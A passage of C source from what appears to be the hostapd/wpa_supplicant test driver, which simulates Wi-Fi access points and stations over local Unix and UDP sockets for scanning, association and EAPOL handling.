> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	struct test_client_socket *cli;
> 
> 	if (drv->test_socket < 0)
> 		return -1;
> 
> 	cli = drv->cli;
> 	while (cli) {
> 		if (memcmp(cli->addr, addr, ETH_ALEN) == 0)
> 			break;
> 		cli = cli->next;
> 	}
> 
> 	if (!cli)
> 		return -1;
> 
> 	return sendto(drv->test_socket, "DISASSOC", 8, 0,
> 		      (struct sockaddr *) &cli->un, cli->unlen);
> }
> 
> 
> static int test_driver_bss_add(void *priv, const char *ifname, const u8 *bssid,
> 			       void *bss_ctx, void **drv_priv)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	struct test_driver_bss *bss;
> 
> 	wpa_printf(MSG_DEBUG, "%s(ifname=%s bssid=" MACSTR ")",
> 		   __func__, ifname, MAC2STR(bssid));
> 
> 	bss = os_zalloc(sizeof(*bss));
> 	if (bss == NULL)
> 		return -1;
> 
> 	bss->bss_ctx = bss_ctx;
> 	bss->drv = drv;
> 	os_strlcpy(bss->ifname, ifname, IFNAMSIZ);
> 	os_memcpy(bss->bssid, bssid, ETH_ALEN);
> 
> 	dl_list_add(&drv->bss, &bss->list);
> 	if (drv->global) {
> 		drv->global->bss_add_used = 1;
> 		os_memcpy(drv->global->req_addr, bssid, ETH_ALEN);
> 	}
> 
> 	if (drv_priv)
> 		*drv_priv = bss;
> 
> 	return 0;
> }
> 
> 
> static int test_driver_bss_remove(void *priv, const char *ifname)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	struct test_driver_bss *bss;
> 	struct test_client_socket *cli, *prev_c;
> 
> 	wpa_printf(MSG_DEBUG, "%s(ifname=%s)", __func__, ifname);
> 
> 	dl_list_for_each(bss, &drv->bss, struct test_driver_bss, list) {
> 		if (strcmp(bss->ifname, ifname) != 0)
> 			continue;
> 
> 		for (prev_c = NULL, cli = drv->cli; cli;
> 		     prev_c = cli, cli = cli->next) {
> 			if (cli->bss != bss)
> 				continue;
> 			if (prev_c)
> 				prev_c->next = cli->next;
> 			else
> 				drv->cli = cli->next;
> 			os_free(cli);
> 			break;
> 		}
> 
> 		dl_list_del(&bss->list);
> 		test_driver_free_bss(bss);
> 		return 0;
> 	}
> 
> 	return -1;
> }
> 
> 
> static int test_driver_if_add(void *priv, enum wpa_driver_if_type type,
> 			      const char *ifname, const u8 *addr,
> 			      void *bss_ctx, void **drv_priv,
> 			      char *force_ifname, u8 *if_addr,
> 			      const char *bridge, int use_existing)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 
> 	wpa_printf(MSG_DEBUG, "%s(type=%d ifname=%s bss_ctx=%p)",
> 		   __func__, type, ifname, bss_ctx);
> 	if (addr)
> 		os_memcpy(if_addr, addr, ETH_ALEN);
> 	else {
> 		drv->alloc_iface_idx++;
> 		if_addr[0] = 0x02; /* locally administered */
> 		sha1_prf(drv->own_addr, ETH_ALEN,
> 			 "hostapd test addr generation",
> 			 (const u8 *) &drv->alloc_iface_idx,
> 			 sizeof(drv->alloc_iface_idx),
> 			 if_addr + 1, ETH_ALEN - 1);
> 	}
> 	if (type == WPA_IF_AP_BSS || type == WPA_IF_P2P_GO ||
> 	    type == WPA_IF_P2P_CLIENT || type == WPA_IF_P2P_GROUP)
> 		return test_driver_bss_add(priv, ifname, if_addr, bss_ctx,
> 					   drv_priv);
> 	return 0;
> }
> 
> 
> static int test_driver_if_remove(void *priv, enum wpa_driver_if_type type,
> 				 const char *ifname)
> {
> 	wpa_printf(MSG_DEBUG, "%s(type=%d ifname=%s)", __func__, type, ifname);
> 	if (type == WPA_IF_AP_BSS || type == WPA_IF_P2P_GO ||
> 	    type == WPA_IF_P2P_CLIENT || type == WPA_IF_P2P_GROUP)
> 		return test_driver_bss_remove(priv, ifname);
> 	return 0;
> }
> 
> 
> static int test_driver_set_ssid(void *priv, const u8 *buf, int len)
> {
> 	struct test_driver_bss *bss = priv;
> 
> 	wpa_printf(MSG_DEBUG, "%s(ifname=%s)", __func__, bss->ifname);
> 	if (len < 0)
> 		return -1;
> 	wpa_hexdump_ascii(MSG_DEBUG, "test_driver_set_ssid: SSID", buf, len);
> 
> 	if ((size_t) len > sizeof(bss->ssid))
> 		return -1;
> 
> 	os_memcpy(bss->ssid, buf, len);
> 	bss->ssid_len = len;
> 
> 	return 0;
> }
> 
> 
> static int test_driver_set_privacy(void *priv, int enabled)
> {
> 	struct test_driver_bss *dbss = priv;
> 
> 	wpa_printf(MSG_DEBUG, "%s(enabled=%d)",  __func__, enabled);
> 	dbss->privacy = enabled;
> 
> 	return 0;
> }
> 
> 
> static int test_driver_set_sta_vlan(void *priv, const u8 *addr,
> 				    const char *ifname, int vlan_id)
> {
> 	wpa_printf(MSG_DEBUG, "%s(addr=" MACSTR " ifname=%s vlan_id=%d)",
> 		   __func__, MAC2STR(addr), ifname, vlan_id);
> 	return 0;
> }
> 
> 
> static int test_driver_sta_add(void *priv,
> 			       struct hostapd_sta_add_params *params)
> {
> 	struct test_driver_bss *bss = priv;
> 	struct wpa_driver_test_data *drv = bss->drv;
> 	struct test_client_socket *cli;
> 
> 	wpa_printf(MSG_DEBUG, "%s(ifname=%s addr=" MACSTR " aid=%d "
> 		   "capability=0x%x listen_interval=%d)",
> 		   __func__, bss->ifname, MAC2STR(params->addr), params->aid,
> 		   params->capability, params->listen_interval);
> 	wpa_hexdump(MSG_DEBUG, "test_driver_sta_add - supp_rates",
> 		    params->supp_rates, params->supp_rates_len);
> 
> 	cli = drv->cli;
> 	while (cli) {
> 		if (os_memcmp(cli->addr, params->addr, ETH_ALEN) == 0)
> 			break;
> 		cli = cli->next;
> 	}
> 	if (!cli) {
> 		wpa_printf(MSG_DEBUG, "%s: no matching client entry",
> 			   __func__);
> 		return -1;
> 	}
> 
> 	cli->bss = bss;
> 
> 	return 0;
> }
> 
> 
> static struct wpa_driver_test_data * test_alloc_data(void *ctx,
> 						     const char *ifname)
> {
> 	struct wpa_driver_test_data *drv;
> 	struct test_driver_bss *bss;
> 
> 	drv = os_zalloc(sizeof(struct wpa_driver_test_data));
> 	if (drv == NULL) {
> 		wpa_printf(MSG_ERROR, "Could not allocate memory for test "
> 			   "driver data");
> 		return NULL;
> 	}
> 
> 	bss = os_zalloc(sizeof(struct test_driver_bss));
> 	if (bss == NULL) {
> 		os_free(drv);
> 		return NULL;
> 	}
> 
> 	drv->ctx = ctx;
> 	wpa_trace_add_ref(drv, ctx, ctx);
> 	dl_list_init(&drv->bss);
> 	dl_list_add(&drv->bss, &bss->list);
> 	os_strlcpy(bss->ifname, ifname, IFNAMSIZ);
> 	bss->bss_ctx = ctx;
> 	bss->drv = drv;
> 
> 	/* Generate a MAC address to help testing with multiple STAs */
> 	drv->own_addr[0] = 0x02; /* locally administered */
> 	sha1_prf((const u8 *) ifname, os_strlen(ifname),
> 		 "test mac addr generation",
> 		 NULL, 0, drv->own_addr + 1, ETH_ALEN - 1);
> 
> 	return drv;
> }
> 
> 
> static void * test_driver_init(struct hostapd_data *hapd,
> 			       struct wpa_init_params *params)
> {
> 	struct wpa_driver_test_data *drv;
> 	struct sockaddr_un addr_un;
> 	struct sockaddr_in addr_in;
> 	struct sockaddr *addr;
> 	socklen_t alen;
> 	struct test_driver_bss *bss;
> 
> 	drv = test_alloc_data(hapd, params->ifname);
> 	if (drv == NULL)
> 		return NULL;
> 	drv->ap = 1;
> 	bss = dl_list_first(&drv->bss, struct test_driver_bss, list);
> 	drv->global = params->global_priv;
> 
> 	bss->bss_ctx = hapd;
> 	os_memcpy(bss->bssid, drv->own_addr, ETH_ALEN);
> 	os_memcpy(params->own_addr, drv->own_addr, ETH_ALEN);
> 
> 	if (params->test_socket) {
> 		if (os_strlen(params->test_socket) >=
> 		    sizeof(addr_un.sun_path)) {
> 			printf("Too long test_socket path\n");
> 			wpa_driver_test_deinit(bss);
> 			return NULL;
> 		}
> 		if (strncmp(params->test_socket, "DIR:", 4) == 0) {
> 			size_t len = strlen(params->test_socket) + 30;
> 			drv->test_dir = os_strdup(params->test_socket + 4);
> 			drv->own_socket_path = os_malloc(len);
> 			if (drv->own_socket_path) {
> 				snprintf(drv->own_socket_path, len,
> 					 "%s/AP-" MACSTR,
> 					 params->test_socket + 4,
> 					 MAC2STR(params->own_addr));
> 			}
> 		} else if (strncmp(params->test_socket, "UDP:", 4) == 0) {
> 			drv->udp_port = atoi(params->test_socket + 4);
> 		} else {
> 			drv->own_socket_path = os_strdup(params->test_socket);
> 		}
> 		if (drv->own_socket_path == NULL && drv->udp_port == 0) {
> 			wpa_driver_test_deinit(bss);
> 			return NULL;
> 		}
> 
> 		drv->test_socket = socket(drv->udp_port ? PF_INET : PF_UNIX,
> 					  SOCK_DGRAM, 0);
> 		if (drv->test_socket < 0) {
> 			perror("socket");
> 			wpa_driver_test_deinit(bss);
> 			return NULL;
> 		}
> 
> 		if (drv->udp_port) {
> 			os_memset(&addr_in, 0, sizeof(addr_in));
> 			addr_in.sin_family = AF_INET;
> 			addr_in.sin_port = htons(drv->udp_port);
> 			addr = (struct sockaddr *) &addr_in;
> 			alen = sizeof(addr_in);
> 		} else {
> 			os_memset(&addr_un, 0, sizeof(addr_un));
> 			addr_un.sun_family = AF_UNIX;
> 			os_strlcpy(addr_un.sun_path, drv->own_socket_path,
> 				   sizeof(addr_un.sun_path));
> 			addr = (struct sockaddr *) &addr_un;
> 			alen = sizeof(addr_un);
> 		}
> 		if (bind(drv->test_socket, addr, alen) < 0) {
> 			perror("test-driver-init: bind(PF_UNIX)");
> 			close(drv->test_socket);
> 			if (drv->own_socket_path)
> 				unlink(drv->own_socket_path);
> 			wpa_driver_test_deinit(bss);
> 			return NULL;
> 		}
> 		eloop_register_read_sock(drv->test_socket,
> 					 test_driver_receive_unix, drv, NULL);
> 	} else
> 		drv->test_socket = -1;
> 
> 	return bss;
> }
> 
> 
> static void wpa_driver_test_poll(void *eloop_ctx, void *timeout_ctx)
> {
> 	struct wpa_driver_test_data *drv = eloop_ctx;
> 
> #ifdef DRIVER_TEST_UNIX
> 	if (drv->associated && drv->hostapd_addr_set) {
> 		struct stat st;
> 		if (stat(drv->hostapd_addr.sun_path, &st) < 0) {
> 			wpa_printf(MSG_DEBUG, "%s: lost connection to AP: %s",
> 				   __func__, strerror(errno));
> 			drv->associated = 0;
> 			wpa_supplicant_event(drv->ctx, EVENT_DISASSOC, NULL);
> 		}
> 	}
> #endif /* DRIVER_TEST_UNIX */
> 
> 	eloop_register_timeout(1, 0, wpa_driver_test_poll, drv, NULL);
> }
> 
> 
> static void wpa_driver_test_scan_timeout(void *eloop_ctx, void *timeout_ctx)
> {
> 	wpa_printf(MSG_DEBUG, "Scan timeout - try to get results");
> 	wpa_supplicant_event(timeout_ctx, EVENT_SCAN_RESULTS, NULL);
> }
> 
> 
> #ifdef DRIVER_TEST_UNIX
> static void wpa_driver_scan_dir(struct wpa_driver_test_data *drv,
> 				const char *path)
> {
> 	struct dirent *dent;
> 	DIR *dir;
> 	struct sockaddr_un addr;
> 	char cmd[512], *pos, *end;
> 	int ret;
> 
> 	dir = opendir(path);
> 	if (dir == NULL)
> 		return;
> 
> 	end = cmd + sizeof(cmd);
> 	pos = cmd;
> 	ret = os_snprintf(pos, end - pos, "SCAN " MACSTR,
> 			  MAC2STR(drv->own_addr));
> 	if (ret >= 0 && ret < end - pos)
> 		pos += ret;
> 	if (drv->probe_req_ie) {
> 		ret = os_snprintf(pos, end - pos, " ");
> 		if (ret >= 0 && ret < end - pos)
> 			pos += ret;
> 		pos += wpa_snprintf_hex(pos, end - pos, drv->probe_req_ie,
> 					drv->probe_req_ie_len);
> 	}
> 	if (drv->probe_req_ssid_len) {
> 		/* Add SSID IE */
> 		ret = os_snprintf(pos, end - pos, "%02x%02x",
> 				  WLAN_EID_SSID,
> 				  (unsigned int) drv->probe_req_ssid_len);
> 		if (ret >= 0 && ret < end - pos)
> 			pos += ret;
> 		pos += wpa_snprintf_hex(pos, end - pos, drv->probe_req_ssid,
> 					drv->probe_req_ssid_len);
> 	}
> 	end[-1] = '\0';
> 
> 	while ((dent = readdir(dir))) {
> 		if (os_strncmp(dent->d_name, "AP-", 3) != 0 &&
> 		    os_strncmp(dent->d_name, "STA-", 4) != 0)
> 			continue;
> 		if (drv->own_socket_path) {
> 			size_t olen, dlen;
> 			olen = os_strlen(drv->own_socket_path);
> 			dlen = os_strlen(dent->d_name);
> 			if (olen >= dlen &&
> 			    os_strcmp(dent->d_name,
> 				      drv->own_socket_path + olen - dlen) == 0)
> 				continue;
> 		}
> 		wpa_printf(MSG_DEBUG, "%s: SCAN %s", __func__, dent->d_name);
> 
> 		os_memset(&addr, 0, sizeof(addr));
> 		addr.sun_family = AF_UNIX;
> 		os_snprintf(addr.sun_path, sizeof(addr.sun_path), "%s/%s",
> 			    path, dent->d_name);
> 
> 		if (sendto(drv->test_socket, cmd, os_strlen(cmd), 0,
> 			   (struct sockaddr *) &addr, sizeof(addr)) < 0) {
> 			perror("sendto(test_socket)");
> 		}
> 	}
> 	closedir(dir);
> }
> #endif /* DRIVER_TEST_UNIX */
> 
> 
> static int wpa_driver_test_scan(void *priv,
> 				struct wpa_driver_scan_params *params)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	size_t i;
> 
> 	wpa_printf(MSG_DEBUG, "%s: priv=%p", __func__, priv);
> 
> 	os_free(drv->probe_req_ie);
> 	if (params->extra_ies) {
> 		drv->probe_req_ie = os_malloc(params->extra_ies_len);
> 		if (drv->probe_req_ie == NULL) {
> 			drv->probe_req_ie_len = 0;
> 			return -1;
> 		}
> 		os_memcpy(drv->probe_req_ie, params->extra_ies,
> 			  params->extra_ies_len);
> 		drv->probe_req_ie_len = params->extra_ies_len;
> 	} else {
> 		drv->probe_req_ie = NULL;
> 		drv->probe_req_ie_len = 0;
> 	}
> 
> 	for (i = 0; i < params->num_ssids; i++)
> 		wpa_hexdump(MSG_DEBUG, "Scan SSID",
> 			    params->ssids[i].ssid, params->ssids[i].ssid_len);
> 	drv->probe_req_ssid_len = 0;
> 	if (params->num_ssids) {
> 		os_memcpy(drv->probe_req_ssid, params->ssids[0].ssid,
> 			  params->ssids[0].ssid_len);
> 		drv->probe_req_ssid_len = params->ssids[0].ssid_len;
> 	}
> 	wpa_hexdump(MSG_DEBUG, "Scan extra IE(s)",
> 		    params->extra_ies, params->extra_ies_len);
> 
> 	drv->num_scanres = 0;
> 
> #ifdef DRIVER_TEST_UNIX
> 	if (drv->test_socket >= 0 && drv->test_dir)
> 		wpa_driver_scan_dir(drv, drv->test_dir);
> 
> 	if (drv->test_socket >= 0 && drv->hostapd_addr_set &&
> 	    sendto(drv->test_socket, "SCAN", 4, 0,
> 		   (struct sockaddr *) &drv->hostapd_addr,
> 		   sizeof(drv->hostapd_addr)) < 0) {
> 		perror("sendto(test_socket)");
> 	}
> #endif /* DRIVER_TEST_UNIX */
> 
> 	if (drv->test_socket >= 0 && drv->hostapd_addr_udp_set &&
> 	    sendto(drv->test_socket, "SCAN", 4, 0,
> 		   (struct sockaddr *) &drv->hostapd_addr_udp,
> 		   sizeof(drv->hostapd_addr_udp)) < 0) {
> 		perror("sendto(test_socket)");
> 	}
> 
> 	eloop_cancel_timeout(wpa_driver_test_scan_timeout, drv, drv->ctx);
> 	eloop_register_timeout(1, 0, wpa_driver_test_scan_timeout, drv,
> 			       drv->ctx);
> 	return 0;
> }
> 
> 
> static struct wpa_scan_results * wpa_driver_test_get_scan_results2(void *priv)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	struct wpa_scan_results *res;
> 	size_t i;
> 
> 	res = os_zalloc(sizeof(*res));
> 	if (res == NULL)
> 		return NULL;
> 
> 	res->res = os_calloc(drv->num_scanres, sizeof(struct wpa_scan_res *));
> 	if (res->res == NULL) {
> 		os_free(res);
> 		return NULL;
> 	}
> 
> 	for (i = 0; i < drv->num_scanres; i++) {
> 		struct wpa_scan_res *r;
> 		if (drv->scanres[i] == NULL)
> 			continue;
> 		r = os_malloc(sizeof(*r) + drv->scanres[i]->ie_len);
> 		if (r == NULL)
> 			break;
> 		os_memcpy(r, drv->scanres[i],
> 			  sizeof(*r) + drv->scanres[i]->ie_len);
> 		res->res[res->num++] = r;
> 	}
> 
> 	return res;
> }
> 
> 
> static int wpa_driver_test_set_key(const char *ifname, void *priv,
> 				   enum wpa_alg alg, const u8 *addr,
> 				   int key_idx, int set_tx,
> 				   const u8 *seq, size_t seq_len,
> 				   const u8 *key, size_t key_len)
> {
> 	wpa_printf(MSG_DEBUG, "%s: ifname=%s priv=%p alg=%d key_idx=%d "
> 		   "set_tx=%d",
> 		   __func__, ifname, priv, alg, key_idx, set_tx);
> 	if (addr)
> 		wpa_printf(MSG_DEBUG, "   addr=" MACSTR, MAC2STR(addr));
> 	if (seq)
> 		wpa_hexdump(MSG_DEBUG, "   seq", seq, seq_len);
> 	if (key)
> 		wpa_hexdump_key(MSG_DEBUG, "   key", key, key_len);
> 	return 0;
> }
> 
> 
> static int wpa_driver_update_mode(struct wpa_driver_test_data *drv, int ap)
> {
> 	if (ap && !drv->ap) {
> 		wpa_driver_test_close_test_socket(drv);
> 		wpa_driver_test_attach(drv, drv->test_dir, 1);
> 		drv->ap = 1;
> 	} else if (!ap && drv->ap) {
> 		wpa_driver_test_close_test_socket(drv);
> 		wpa_driver_test_attach(drv, drv->test_dir, 0);
> 		drv->ap = 0;
> 	}
> 
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_associate(
> 	void *priv, struct wpa_driver_associate_params *params)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	wpa_printf(MSG_DEBUG, "%s: priv=%p freq=%d pairwise_suite=%d "
> 		   "group_suite=%d key_mgmt_suite=%d auth_alg=%d mode=%d",
> 		   __func__, priv, params->freq.freq, params->pairwise_suite,
> 		   params->group_suite, params->key_mgmt_suite,
> 		   params->auth_alg, params->mode);
> 	wpa_driver_update_mode(drv, params->mode == IEEE80211_MODE_AP);
> 	if (params->bssid) {
> 		wpa_printf(MSG_DEBUG, "   bssid=" MACSTR,
> 			   MAC2STR(params->bssid));
> 	}
> 	if (params->ssid) {
> 		wpa_hexdump_ascii(MSG_DEBUG, "   ssid",
> 				  params->ssid, params->ssid_len);
> 	}
> 	if (params->wpa_ie) {
> 		wpa_hexdump(MSG_DEBUG, "   wpa_ie",
> 			    params->wpa_ie, params->wpa_ie_len);
> 		drv->assoc_wpa_ie_len = params->wpa_ie_len;
> 		if (drv->assoc_wpa_ie_len > sizeof(drv->assoc_wpa_ie))
> 			drv->assoc_wpa_ie_len = sizeof(drv->assoc_wpa_ie);
> 		os_memcpy(drv->assoc_wpa_ie, params->wpa_ie,
> 			  drv->assoc_wpa_ie_len);
> 	} else
> 		drv->assoc_wpa_ie_len = 0;
> 
> 	wpa_driver_update_mode(drv, params->mode == IEEE80211_MODE_AP);
> 
> 	drv->ibss = params->mode == IEEE80211_MODE_IBSS;
> 	dbss->privacy = params->key_mgmt_suite &
> 		(WPA_KEY_MGMT_IEEE8021X |
> 		 WPA_KEY_MGMT_PSK |
> 		 WPA_KEY_MGMT_WPA_NONE |
> 		 WPA_KEY_MGMT_FT_IEEE8021X |
> 		 WPA_KEY_MGMT_FT_PSK |
> 		 WPA_KEY_MGMT_IEEE8021X_SHA256 |
> 		 WPA_KEY_MGMT_PSK_SHA256);
> 	if (params->wep_key_len[params->wep_tx_keyidx])
> 		dbss->privacy = 1;
> 
> #ifdef DRIVER_TEST_UNIX
> 	if (drv->test_dir && params->bssid &&
> 	    params->mode != IEEE80211_MODE_IBSS) {
> 		os_memset(&drv->hostapd_addr, 0, sizeof(drv->hostapd_addr));
> 		drv->hostapd_addr.sun_family = AF_UNIX;
> 		os_snprintf(drv->hostapd_addr.sun_path,
> 			    sizeof(drv->hostapd_addr.sun_path),
> 			    "%s/AP-" MACSTR,
> 			    drv->test_dir, MAC2STR(params->bssid));
> 		drv->hostapd_addr_set = 1;
> 	}
> #endif /* DRIVER_TEST_UNIX */
> 
> 	if (params->mode == IEEE80211_MODE_AP) {
> 		if (params->ssid)
> 			os_memcpy(dbss->ssid, params->ssid, params->ssid_len);
> 		dbss->ssid_len = params->ssid_len;
> 		os_memcpy(dbss->bssid, drv->own_addr, ETH_ALEN);
> 		if (params->wpa_ie && params->wpa_ie_len) {
> 			dbss->ie = os_malloc(params->wpa_ie_len);
> 			if (dbss->ie) {
> 				os_memcpy(dbss->ie, params->wpa_ie,
> 					  params->wpa_ie_len);
> 				dbss->ielen = params->wpa_ie_len;
> 			}
> 		}
> 	} else if (drv->test_socket >= 0 &&
> 		   (drv->hostapd_addr_set || drv->hostapd_addr_udp_set)) {
> 		char cmd[200], *pos, *end;
> 		int ret;
> 		end = cmd + sizeof(cmd);
> 		pos = cmd;
> 		ret = os_snprintf(pos, end - pos, "ASSOC " MACSTR " ",
> 				  MAC2STR(drv->own_addr));
> 		if (ret >= 0 && ret < end - pos)
> 			pos += ret;
> 		if (params->ssid)
> 			pos += wpa_snprintf_hex(pos, end - pos, params->ssid,
> 						params->ssid_len);
> 		ret = os_snprintf(pos, end - pos, " ");
> 		if (ret >= 0 && ret < end - pos)
> 			pos += ret;
> 		pos += wpa_snprintf_hex(pos, end - pos, params->wpa_ie,
> 					params->wpa_ie_len);
> 		end[-1] = '\0';
> #ifdef DRIVER_TEST_UNIX
> 		if (drv->hostapd_addr_set &&
> 		    sendto(drv->test_socket, cmd, os_strlen(cmd), 0,
> 			   (struct sockaddr *) &drv->hostapd_addr,
> 			   sizeof(drv->hostapd_addr)) < 0) {
> 			perror("sendto(test_socket)");
> 			return -1;
> 		}
> #endif /* DRIVER_TEST_UNIX */
> 		if (drv->hostapd_addr_udp_set &&
> 		    sendto(drv->test_socket, cmd, os_strlen(cmd), 0,
> 			   (struct sockaddr *) &drv->hostapd_addr_udp,
> 			   sizeof(drv->hostapd_addr_udp)) < 0) {
> 			perror("sendto(test_socket)");
> 			return -1;
> 		}
> 
> 		if (params->ssid)
> 			os_memcpy(dbss->ssid, params->ssid, params->ssid_len);
> 		dbss->ssid_len = params->ssid_len;
> 	} else {
> 		drv->associated = 1;
> 		if (params->mode == IEEE80211_MODE_IBSS) {
> 			if (params->ssid)
> 				os_memcpy(dbss->ssid, params->ssid,
> 					  params->ssid_len);
> 			dbss->ssid_len = params->ssid_len;
> 			if (params->bssid)
> 				os_memcpy(dbss->bssid, params->bssid,
> 					  ETH_ALEN);
> 			else {
> 				os_get_random(dbss->bssid, ETH_ALEN);
> 				dbss->bssid[0] &= ~0x01;
> 				dbss->bssid[0] |= 0x02;
> 			}
> 		}
> 		wpa_supplicant_event(drv->ctx, EVENT_ASSOC, NULL);
> 	}
> 
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_get_bssid(void *priv, u8 *bssid)
> {
> 	struct test_driver_bss *dbss = priv;
> 	os_memcpy(bssid, dbss->bssid, ETH_ALEN);
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_get_ssid(void *priv, u8 *ssid)
> {
> 	struct test_driver_bss *dbss = priv;
> 	os_memcpy(ssid, dbss->ssid, 32);
> 	return dbss->ssid_len;
> }
> 
> 
> static int wpa_driver_test_send_disassoc(struct wpa_driver_test_data *drv)
> {
> #ifdef DRIVER_TEST_UNIX
> 	if (drv->test_socket >= 0 &&
> 	    sendto(drv->test_socket, "DISASSOC", 8, 0,
> 		   (struct sockaddr *) &drv->hostapd_addr,
> 		   sizeof(drv->hostapd_addr)) < 0) {
> 		perror("sendto(test_socket)");
> 		return -1;
> 	}
> #endif /* DRIVER_TEST_UNIX */
> 	if (drv->test_socket >= 0 && drv->hostapd_addr_udp_set &&
> 	    sendto(drv->test_socket, "DISASSOC", 8, 0,
> 		   (struct sockaddr *) &drv->hostapd_addr_udp,
> 		   sizeof(drv->hostapd_addr_udp)) < 0) {
> 		perror("sendto(test_socket)");
> 		return -1;
> 	}
> 	return 0;
> }
> 
> 
> static int wpa_driver_test_deauthenticate(void *priv, const u8 *addr,
> 					  int reason_code)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	wpa_printf(MSG_DEBUG, "%s addr=" MACSTR " reason_code=%d",
> 		   __func__, MAC2STR(addr), reason_code);
> 	os_memset(dbss->bssid, 0, ETH_ALEN);
> 	drv->associated = 0;
> 	wpa_supplicant_event(drv->ctx, EVENT_DISASSOC, NULL);
> 	return wpa_driver_test_send_disassoc(drv);
> }
> 
> 
> static const u8 * wpa_scan_get_ie(const struct wpa_scan_res *res, u8 ie)
> {
> 	const u8 *end, *pos;
> 
> 	pos = (const u8 *) (res + 1);
> 	end = pos + res->ie_len;
> 
> 	while (pos + 1 < end) {
> 		if (pos + 2 + pos[1] > end)
> 			break;
> 		if (pos[0] == ie)
> 			return pos;
> 		pos += 2 + pos[1];
> 	}
> 
> 	return NULL;
> }
> 
> 
> static void wpa_driver_test_scanresp(struct wpa_driver_test_data *drv,
> 				     struct sockaddr *from,
> 				     socklen_t fromlen,
> 				     const char *data)
> {
> 	struct wpa_scan_res *res;
> 	const char *pos, *pos2;
> 	size_t len;
> 	u8 *ie_pos, *ie_start, *ie_end;
> #define MAX_IE_LEN 1000
> 	const u8 *ds_params;
> 
> 	wpa_printf(MSG_DEBUG, "test_driver: SCANRESP %s", data);
> 	if (drv->num_scanres >= MAX_SCAN_RESULTS) {
> 		wpa_printf(MSG_DEBUG, "test_driver: No room for the new scan "
> 			   "result");
> 		return;
> 	}
> 
> 	/* SCANRESP BSSID SSID IEs */
> 
> 	res = os_zalloc(sizeof(*res) + MAX_IE_LEN);
> 	if (res == NULL)
> 		return;
> 	ie_start = ie_pos = (u8 *) (res + 1);
> 	ie_end = ie_pos + MAX_IE_LEN;
> 
> 	if (hwaddr_aton(data, res->bssid)) {
> 		wpa_printf(MSG_DEBUG, "test_driver: invalid BSSID in scanres");
> 		os_free(res);
> 		return;
> 	}
> 
> 	pos = data + 17;
> 	while (*pos == ' ')
> 		pos++;
> 	pos2 = os_strchr(pos, ' ');
> 	if (pos2 == NULL) {
> 		wpa_printf(MSG_DEBUG, "test_driver: invalid SSID termination "
> 			   "in scanres");
> 		os_free(res);
> 		return;
> 	}
> 	len = (pos2 - pos) / 2;
> 	if (len > 32)
> 		len = 32;
> 	/*
> 	 * Generate SSID IE from the SSID field since this IE is not included
> 	 * in the main IE field.
> 	 */
> 	*ie_pos++ = WLAN_EID_SSID;
> 	*ie_pos++ = len;
> 	if (hexstr2bin(pos, ie_pos, len) < 0) {
> 		wpa_printf(MSG_DEBUG, "test_driver: invalid SSID in scanres");
> 		os_free(res);
> 		return;
> 	}
> 	ie_pos += len;
> 
> 	pos = pos2 + 1;
> 	pos2 = os_strchr(pos, ' ');
> 	if (pos2 == NULL)
> 		len = os_strlen(pos) / 2;
> 	else
> 		len = (pos2 - pos) / 2;
> 	if ((int) len > ie_end - ie_pos)
> 		len = ie_end - ie_pos;
> 	if (hexstr2bin(pos, ie_pos, len) < 0) {
> 		wpa_printf(MSG_DEBUG, "test_driver: invalid IEs in scanres");
> 		os_free(res);
> 		return;
> 	}
> 	ie_pos += len;
> 	res->ie_len = ie_pos - ie_start;
> 
> 	if (pos2) {
> 		pos = pos2 + 1;
> 		while (*pos == ' ')
> 			pos++;
> 		if (os_strstr(pos, "PRIVACY"))
> 			res->caps |= IEEE80211_CAP_PRIVACY;
> 		if (os_strstr(pos, "IBSS"))
> 			res->caps |= IEEE80211_CAP_IBSS;
> 	}
> 
> 	ds_params = wpa_scan_get_ie(res, WLAN_EID_DS_PARAMS);
> 	if (ds_params && ds_params[1] > 0) {
> 		if (ds_params[2] >= 1 && ds_params[2] <= 13)
> 			res->freq = 2407 + ds_params[2] * 5;
> 	}
> 
> 	os_free(drv->scanres[drv->num_scanres]);
> 	drv->scanres[drv->num_scanres++] = res;
> }
> 
> 
> static void wpa_driver_test_assocresp(struct wpa_driver_test_data *drv,
> 				      struct sockaddr *from,
> 				      socklen_t fromlen,
> 				      const char *data)
> {
> 	struct test_driver_bss *bss;
> 
> 	bss = dl_list_first(&drv->bss, struct test_driver_bss, list);
> 
> 	/* ASSOCRESP BSSID <res> */
> 	if (hwaddr_aton(data, bss->bssid)) {
> 		wpa_printf(MSG_DEBUG, "test_driver: invalid BSSID in "
> 			   "assocresp");
> 	}
> 	if (drv->use_associnfo) {
> 		union wpa_event_data event;
> 		os_memset(&event, 0, sizeof(event));
> 		event.assoc_info.req_ies = drv->assoc_wpa_ie;
> 		event.assoc_info.req_ies_len = drv->assoc_wpa_ie_len;
> 		wpa_supplicant_event(drv->ctx, EVENT_ASSOCINFO, &event);
> 	}
> 	drv->associated = 1;
> 	wpa_supplicant_event(drv->ctx, EVENT_ASSOC, NULL);
> }
> 
> 
> static void wpa_driver_test_disassoc(struct wpa_driver_test_data *drv,
> 				     struct sockaddr *from,
> 				     socklen_t fromlen)
> {
> 	drv->associated = 0;
> 	wpa_supplicant_event(drv->ctx, EVENT_DISASSOC, NULL);
> }
> 
> 
> static void wpa_driver_test_eapol(struct wpa_driver_test_data *drv,
> 				  struct sockaddr *from,
> 				  socklen_t fromlen,
> 				  const u8 *data, size_t data_len)
> {
> 	const u8 *src;
> 	struct test_driver_bss *bss;
> 
> 	bss = dl_list_first(&drv->bss, struct test_driver_bss, list);
> 
> 	if (data_len > 14) {
> 		/* Skip Ethernet header */
> 		src = data + ETH_ALEN;
> 		data += 14;
> 		data_len -= 14;
> 	} else
> 		src = bss->bssid;
> 
